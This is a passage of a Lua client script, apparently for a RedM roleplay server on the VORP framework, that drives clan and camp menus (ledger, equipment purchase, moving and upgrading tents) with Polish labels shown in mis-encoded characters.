local keyopen = false --addprop
local clanname = nil
local flag = 0
local clanboss = 0
local clanid2 = 0
local clancount = 0
local count2 = 0
local id = 0
local newleader = 0
local campregistered = 0
local campregistered2 = 0
local hastent1z = 0
local hastent2z = 0
local hastent3z = 0
local hastent4z = 0
local hastent5z = 0
local campfirez = 0
local hitch1z = 0
local hitch2z = 0
local tablez = 0
local inventoryz = 0
local stewz = 0
local chair1z = 0
local chair2z = 0
local chair3z = 0
local chair4z = 0
local chair5z = 0
local barrelz = 0
local destillerz = 0
local tannerz = 0
local blip = 0
local playeridinclan = {}
local campdetails = {}
local camplocation2 = 0
local campspot = 0
local upgradespot = 0
local poutifts = 0
local playerskin = 0
local tentslotno = 0
local equip = 0
local proping = 0
local slot = 0
local model = 0
local cartz = 0
local cash = 0
local xp = 0
local lev = 0
local materialz = 0
local stockz = 0
local stockmission = 0
local cashstatus = 0
local spawncart = false
local inroute = false
local missionwagon = 0
local playernamez = 0
local playermoney = 0
local web = 0
local campflagofplayer = 0
local inv = {x=0, y=0, z=0}
local food = {x=0, y=0, z=0}
local flg = {x=0, y=0, z=0}
local butcher = {x=0, y=0, z=0}
local tent1y = {x=0, y=0, z=0}
local tent2y = {x=0, y=0, z=0}
local tent3y = {x=0, y=0, z=0}
local tent4y = {x=0, y=0, z=0}
local tent5y = {x=0, y=0, z=0}
local inrange = false
local VORPCore = {}
local mission = false
local p1 = nil
local onjob = false
local deliverlocation = {x=0,y=0,z=0}
local b2 = 500
local enemycount = 0
local timer = 0
local aikilled = false
local num  = 0
local spawnai = false
local createdped = 0
local car = 0
local ai = {}
local lookforai = false
local cost = 0
local total = 0
local qtstew = 0

Citizen.CreateThread(function()
    while not VORPCore do        
        TriggerEvent("getCore", function(core)
            VORPCore = core
        end)
        Citizen.Await(200)
    end
end)

function DrawTxt(str, x, y, w, h, enableShadow, col1, col2, col3, a, centre)
    local str = CreateVarString(10, "LITERAL_STRING", str)
    SetTextScale(w, h)
    SetTextColor(math.floor(col1), math.floor(col2), math.floor(col3), math.floor(a))
    SetTextCentre(centre)
    SetTextFontForCurrentCommand(15) 
    if enableShadow then SetTextDropshadow(1, 0, 0, 0, 255) end
    DisplayText(str, x, y)
end

function whenKeyJustPressed(key)
    if Citizen.InvokeNative(0x580417101DDB492F, 0, key) then
        return true
    else
        return false
    end
end

Citizen.CreateThread(function()
    while true do 
        Citizen.Wait(1)
        local sleep = true
        local player = PlayerPedId()
        local Coords = GetEntityCoords(player)
        local flag1 = DoesObjectOfTypeExistAtCoords(Coords.x, Coords.y, Coords.z, 1.5, -229587575, 0) -- prop required to interact
        if DoesObjectOfTypeExistAtCoords(Coords.x, Coords.y, Coords.z, 1.5, -229587575, 0) ~= false then 
            sleep = false
           DrawTxt("NaciĹ›nij [~e~G~q~] aby otworzy Menu obozowe", 0.50, 0.95, 0.7, 0.5, true, 255, 255, 255, 255, true)

            if whenKeyJustPressed(Config.keys.three) then

                    TriggerServerEvent('syn:getclan')
                    TriggerServerEvent("syn:getclanid")
                    Citizen.Wait(400)
                    TriggerServerEvent("syn:getcamp",clanid2)
                    Citizen.Wait(400)
                    if keyopen == false then
                        WarMenu.OpenMenu('clanmenu')
                    else end
               
            end
        end
        if sleep then 
            Citizen.Wait(1000)
        end

    end
end)

Citizen.CreateThread(function()
    while true do 
        Citizen.Wait(1)
            if whenKeyJustPressed(Config.keys.two) then
                    TriggerServerEvent('syn:getclan')
                    TriggerServerEvent("syn:getclanid")
                    Citizen.Wait(400)
                    TriggerServerEvent("syn:getcamp",clanid2)
                    Citizen.Wait(600)
                    if clanid2 > 1 then
                        if keyopen == false then
                            WarMenu.OpenMenu('clanoptions')
                        else end 
                    else
                        TriggerEvent("vorp:TipBottom", 'nie naleĹĽysz do klanu', 4000)
                    end
                
            end
        
    end
end)


Citizen.CreateThread( function()
    WarMenu.CreateMenu('clanmenu', 'Flaga Klanu')
    WarMenu.CreateMenu('clanoptions', 'Opcje Klanu')
    WarMenu.CreateMenu('wardrobe', 'Namiot')
    WarMenu.CreateMenu('butcher', 'RzeĹşnik')
    WarMenu.CreateMenu('stew', 'Garnek do gulaszu')
    WarMenu.CreateSubMenu('createclan', 'clanmenu', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('ledger', 'clanmenu', 'KsiÄ™ga Klanu')
    WarMenu.CreateSubMenu('disband', 'clanmenu', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('changename', 'clanmenu', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('registercamp', 'clanmenu', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('upgrades', 'clanmenu', 'Opcje WyposaĹĽenia')
    WarMenu.CreateSubMenu('moveequip', 'clanmenu', 'Kategorie WyposaĹĽenia')
    WarMenu.CreateSubMenu('tentslot', 'clanmenu', 'Wybierz SprzÄ™t')
    WarMenu.CreateSubMenu('upgradeequipment', 'clanmenu', 'Wybierz WprzÄ™t')
    WarMenu.CreateSubMenu('tentupgrades1', 'clanmenu', 'Namiot 1') -- 
    WarMenu.CreateSubMenu('tentupgrades2', 'clanmenu', 'Namiot 2')
    WarMenu.CreateSubMenu('tentupgrades3', 'clanmenu', 'Namiot 3')
    WarMenu.CreateSubMenu('tentupgrades4', 'clanmenu', 'Namiot 4')
    WarMenu.CreateSubMenu('tentupgrades5', 'clanmenu', 'Namiot 5')
    WarMenu.CreateSubMenu('kickmember', 'clanoptions', 'Wykop CzĹ‚onka')
    WarMenu.CreateSubMenu('viewmembers', 'clanoptions', 'WyĹ›wietl CzĹ‚onkĂłw')
    WarMenu.CreateSubMenu('outfits', 'wardrobe', 'Wybierz StrĂłj')
    WarMenu.CreateSubMenu('leave', 'clanoptions', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('inviteplayer', 'clanoptions', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('switchleader', 'clanoptions', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('cart', 'butcher', 'WĂłz MyĹ›liwski')
    WarMenu.CreateSubMenu('deliver', 'butcher', 'Wybierz dostawÄ™')
    WarMenu.CreateSubMenu('web', 'clanmenu', 'JesteĹ› Pewny?')
    WarMenu.CreateSubMenu('cook', 'stew', 'Przepisy:')
    WarMenu.CreateSubMenu('recipe1', 'cook', 'SkĹ‚adniki:')
    WarMenu.CreateSubMenu('recipe2', 'cook', 'SkĹ‚adniki:')
    WarMenu.CreateSubMenu('recipe3', 'cook', 'SkĹ‚adniki:')
    WarMenu.CreateSubMenu('recipe4', 'cook', 'SkĹ‚adniki:')

	while true do
        if WarMenu.IsMenuOpened('clanmenu') then
            
            
         if clanid2 == 0 then WarMenu.MenuButton('UtwĂłrz Klan', 'createclan') else end
         if clanboss == 1 and campregistered == 0 then WarMenu.MenuButton('Zarejestruj LokalizacjÄ™ Obozu', 'registercamp') else end
         if clanboss == 1 and campregistered2 == 1 and inrange then WarMenu.MenuButton('WyposaĹĽenie Obozu', 'upgrades') else end
         if clanboss == 1 then WarMenu.MenuButton('ZmieĹ„ NazwÄ™ Klanu', 'changename') else end
         if clanid2 > 0 and campregistered2 == 1 and inrange then WarMenu.MenuButton('KsiÄ™ga Klanu', 'ledger') else end
         if clanboss == 1 and campregistered2 == 1 and inrange and Config.webhook and Config.allowplayer then WarMenu.MenuButton('Add/Change discord webhook', 'web') else end
         if clanboss == 1 then WarMenu.MenuButton('RozwiÄ…ĹĽ Klan & UsuĹ„ ObĂłz', 'disband') else end

        elseif WarMenu.IsMenuOpened('web') then
            if WarMenu.Button('Tak') then
            TriggerEvent("syn:webhook")
            WarMenu.CloseMenu()
            end
    
            if WarMenu.Button('Nie') then
                WarMenu.CloseMenu()
            end
        elseif WarMenu.IsMenuOpened('ledger') then

            if WarMenu.Button('KsiÄ™ga klanu: '..cash..' $') then
            end
            if inrange then
                if WarMenu.Button('WpĹ‚aÄ‡') then
                    local closestPlayer, closestDistance = GetClosestPlayer()
                    if closestPlayer ~= -1 and closestDistance <= 2.0 then
                    TriggerEvent("syn:warndistance2")
                    WarMenu.CloseMenu()
                    else
                        cashstatus = 1
                        TriggerEvent("syn:ledger")
                        WarMenu.CloseMenu()
                    end
                end
            else
                WarMenu.CloseMenu()
            end
            if WarMenu.Button('WypĹ‚aÄ‡') then
                local closestPlayer, closestDistance = GetClosestPlayer()
                if closestPlayer ~= -1 and closestDistance <= 2.0 then
                   TriggerEvent("syn:warndistance2")
                   WarMenu.CloseMenu()
                else
                    cashstatus = 2
                    TriggerEvent("syn:ledger")
                    WarMenu.CloseMenu()
                end

            end

        elseif WarMenu.IsMenuOpened('moveequip') then

           

            if hastent1z == 0 then
            else
                if WarMenu.Button('Namiot 1') then
                    equip = 1
                    local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
             if hastent2z == 0 then
            else
                if WarMenu.Button('Namiot 2') then
                    equip = 2
                    local type = 2
                    TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if hastent3z == 0 then
            else
                if WarMenu.Button('Namiot 3') then
                    equip = 3
                    local type = 2
                    TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if hastent4z == 0 then
            else
                if WarMenu.Button('Namiot 4') then
                    equip = 4
                    local type = 2
                    TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if hastent5z == 0 then
            else
                if WarMenu.Button('Namiot 5') then
                    equip = 5
                    local type = 2
                    TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if chair1z == 0 then
            else
                if WarMenu.Button('KrzesĹ‚o 1') then
                    equip = 12
                    local type = 2
                    TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if chair2z == 0 then
            else
                if WarMenu.Button('KrzesĹ‚o 2') then
                    equip = 13
                    local type = 2
                    TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if chair3z == 0 then
            else
                if WarMenu.Button('KrzesĹ‚o 3') then
                    equip = 14
                    local type = 2
                    TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if chair4z == 0 then
            else
                if WarMenu.Button('KrzesĹ‚o 4') then
                    equip = 15
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if chair5z == 0 then
            else
                if WarMenu.Button('KrzesĹ‚o 5') then
                    equip = 16
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if campfirez == 0 then
            else
                if WarMenu.Button('OgieĹ„') then
                    equip = 6
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if hitch1z == 0 then
            else
                if WarMenu.Button('SĹ‚upki Zaczepowe 1') then
                    equip = 7
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            
            if hitch2z == 0 then
            else
                if WarMenu.Button('SĹ‚upki Zaczepowe 2') then
                    equip = 8
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if tablez == 0 then
            else
                if WarMenu.Button('StĂłĹ‚') then
                    equip = 9
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if inventoryz == 0 then
            else
                if WarMenu.Button('Ekwipunek') then
                    equip = 10
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if stewz == 0 then
            else
                if WarMenu.Button('Garnek do gulaszu') then
                    equip = 11
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if barrelz == 0 then
            else
                if WarMenu.Button('Beczka Moonshine') then
                    equip = 17
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if destillerz == 0 then
            else
                if WarMenu.Button('Beczka Moonshine') then
                    equip = 18
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end
            if tannerz == 0 then
            else
                if WarMenu.Button('Ekwipunek RzeĹşniczy') then
                    equip = 19
                local type = 2
                TriggerServerEvent('syn:props',clanid2, type)
                WarMenu.CloseMenu()
                end
            end 


           
           

        elseif WarMenu.IsMenuOpened('upgrades') then
            if WarMenu.MenuButton("Kup sprzÄ™t", 'tentslot') then end
            if WarMenu.MenuButton("Ulepsz WyposaĹĽenie", 'upgradeequipment') then end
            if clanboss == 1 and campregistered2 == 1 then WarMenu.MenuButton('PrzenieĹ› wyposaĹĽenie obozu', 'moveequip') else end


        elseif WarMenu.IsMenuOpened('upgradeequipment') then
            if hastent1z == 0 then else WarMenu.MenuButton("Namiot 1 ulepszenia", 'tentupgrades1')  end
            if hastent2z == 0 then else WarMenu.MenuButton("Namiot 2 ulepszenia", 'tentupgrades2')  end
            if hastent3z == 0 then else WarMenu.MenuButton("Namiot 3 ulepszenia", 'tentupgrades3')  end
            if hastent4z == 0 then else WarMenu.MenuButton("Namiot 4 ulepszenia", 'tentupgrades4')  end
            if hastent5z == 0 then else WarMenu.MenuButton("Namiot 5 ulepszenia", 'tentupgrades5')  end
 

        elseif WarMenu.IsMenuOpened('tentupgrades1') then -- 
            if hastent1z == 0 then
            else
                if WarMenu.Button(Config.Language.tipi..' '..Config.equipmentprice.tipi.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tipi) then
                    if lev >=  Config.level.tipi then

                        cost = Config.equipmentprice.tipi
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 1
                            model = 1
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end                
            end
            if hastent1z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu2..' '..Config.equipmentprice.tentu2.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu2) then
                    if lev >=  Config.level.tentu2 then

                        cost = Config.equipmentprice.tentu2
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 1
                            model = 2
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent1z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu3..' '..Config.equipmentprice.tentu3.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu3) then
                    if lev >=  Config.level.tentu3 then

                        cost = Config.equipmentprice.tentu3
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 1
                            model = 3
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent1z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu4..' '..Config.equipmentprice.tentu4.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu4) then
                    if lev >=  Config.level.tentu4 then

                        cost = Config.equipmentprice.tentu4
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 1
                            model = 4
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent1z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu5..' '..Config.equipmentprice.tentu5.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu5) then
                    if lev >=  Config.level.tentu5 then

                        cost = Config.equipmentprice.tentu5
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 1
                            model = 5
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent1z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu6..' '..Config.equipmentprice.tentu6.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu6) then
                    if lev >=  Config.level.tentu6 then

                        cost = Config.equipmentprice.tentu6
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 1
                            model = 6
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end

        elseif WarMenu.IsMenuOpened('tentupgrades2') then -- 
            if hastent2z == 0 then
            else
                if WarMenu.Button(Config.Language.tipi..' '..Config.equipmentprice.tipi.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tipi) then
                    if lev >=  Config.level.tipi then
        
                        cost = Config.equipmentprice.tipi
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 2
                            model = 1
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end                
            end
            if hastent2z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu2..' '..Config.equipmentprice.tentu2.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu2) then
                    if lev >=  Config.level.tentu2 then
        
                        cost = Config.equipmentprice.tentu2
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 2
                            model = 2
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent2z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu3..' '..Config.equipmentprice.tentu3.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu3) then
                    if lev >=  Config.level.tentu3 then
        
                        cost = Config.equipmentprice.tentu3
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 2
                            model = 3
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent2z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu4..' '..Config.equipmentprice.tentu4.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu4) then
                    if lev >=  Config.level.tentu4 then
        
                        cost = Config.equipmentprice.tentu4
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 2
                            model = 4
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent2z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu5..' '..Config.equipmentprice.tentu5.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu5) then
                    if lev >=  Config.level.tentu5 then
        
                        cost = Config.equipmentprice.tentu5
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 2
                            model = 5
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent2z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu6..' '..Config.equipmentprice.tentu6.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu6) then
                    if lev >=  Config.level.tentu6 then
        
                        cost = Config.equipmentprice.tentu6
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 2
                            model = 6
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end            
           
        elseif WarMenu.IsMenuOpened('tentupgrades3') then -- 
            if hastent3z == 0 then
            else
                if WarMenu.Button(Config.Language.tipi..' '..Config.equipmentprice.tipi.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tipi) then
                    if lev >=  Config.level.tipi then
        
                        cost = Config.equipmentprice.tipi
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 3
                            model = 1
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end                
            end
            if hastent3z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu2..' '..Config.equipmentprice.tentu2.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu2) then
                    if lev >=  Config.level.tentu2 then
        
                        cost = Config.equipmentprice.tentu2
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 3
                            model = 2
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent3z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu3..' '..Config.equipmentprice.tentu3.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu3) then
                    if lev >=  Config.level.tentu3 then
        
                        cost = Config.equipmentprice.tentu3
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 3
                            model = 3
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent3z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu4..' '..Config.equipmentprice.tentu4.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu4) then
                    if lev >=  Config.level.tentu4 then
        
                        cost = Config.equipmentprice.tentu4
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 3
                            model = 4
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent3z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu5..' '..Config.equipmentprice.tentu5.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu5) then
                    if lev >=  Config.level.tentu5 then
        
                        cost = Config.equipmentprice.tentu5
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 3
                            model = 5
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent3z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu6..' '..Config.equipmentprice.tentu6.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu6) then
                    if lev >=  Config.level.tentu6 then
        
                        cost = Config.equipmentprice.tentu6
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 3
                            model = 6
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end            
        elseif WarMenu.IsMenuOpened('tentupgrades4') then -- 
            if hastent4z == 0 then
            else
                if WarMenu.Button(Config.Language.tipi..' '..Config.equipmentprice.tipi.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tipi) then
                    if lev >=  Config.level.tipi then
        
                        cost = Config.equipmentprice.tipi
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 4
                            model = 1
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end                
            end
            if hastent4z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu2..' '..Config.equipmentprice.tentu2.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu2) then
                    if lev >=  Config.level.tentu2 then
        
                        cost = Config.equipmentprice.tentu2
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 4
                            model = 2
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent4z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu3..' '..Config.equipmentprice.tentu3.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu3) then
                    if lev >=  Config.level.tentu3 then
        
                        cost = Config.equipmentprice.tentu3
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 4
                            model = 3
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent4z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu4..' '..Config.equipmentprice.tentu4.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu4) then
                    if lev >=  Config.level.tentu4 then
        
                        cost = Config.equipmentprice.tentu4
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 4
                            model = 4
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent4z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu5..' '..Config.equipmentprice.tentu5.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu5) then
                    if lev >=  Config.level.tentu5 then
        
                        cost = Config.equipmentprice.tentu5
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 4
                            model = 5
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent4z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu6..' '..Config.equipmentprice.tentu6.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu6) then
                    if lev >=  Config.level.tentu6 then
        
                        cost = Config.equipmentprice.tentu6
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 4
                            model = 6
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end           
        elseif WarMenu.IsMenuOpened('tentupgrades5') then -- 
            if hastent5z == 0 then
            else
                if WarMenu.Button(Config.Language.tipi..' '..Config.equipmentprice.tipi.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tipi) then
                    if lev >=  Config.level.tipi then
        
                        cost = Config.equipmentprice.tipi
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 5
                            model = 1
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end                
            end
            if hastent5z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu2..' '..Config.equipmentprice.tentu2.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu2) then
                    if lev >=  Config.level.tentu2 then
        
                        cost = Config.equipmentprice.tentu2
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 5
                            model = 2
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent5z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu3..' '..Config.equipmentprice.tentu3.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu3) then
                    if lev >=  Config.level.tentu3 then
        
                        cost = Config.equipmentprice.tentu3
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 5
                            model = 3
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent5z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu4..' '..Config.equipmentprice.tentu4.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu4) then
                    if lev >=  Config.level.tentu4 then
        
                        cost = Config.equipmentprice.tentu4
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 5
                            model = 4
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
                        WarMenu.CloseMenu()
                    end
                end 
            end
            if hastent5z == 0 then
            else
                if WarMenu.Button(Config.Language.tentu5..' '..Config.equipmentprice.tentu5.." "..Config.webhookLanguage.currency.." "..Config.Language.level.." "..Config.level.tentu5) then
                    if lev >=  Config.level.tentu5 then
        
                        cost = Config.equipmentprice.tentu5
                         total = cash - cost
                        if 0 > total then
                            TriggerEvent("vorp:TipBottom", Config.Language.nocashinledger, 2000)
                        else
                            slot = 5
                            model = 5
                            local type = 3
                            TriggerServerEvent('syn:props',clanid2, type)
                        end
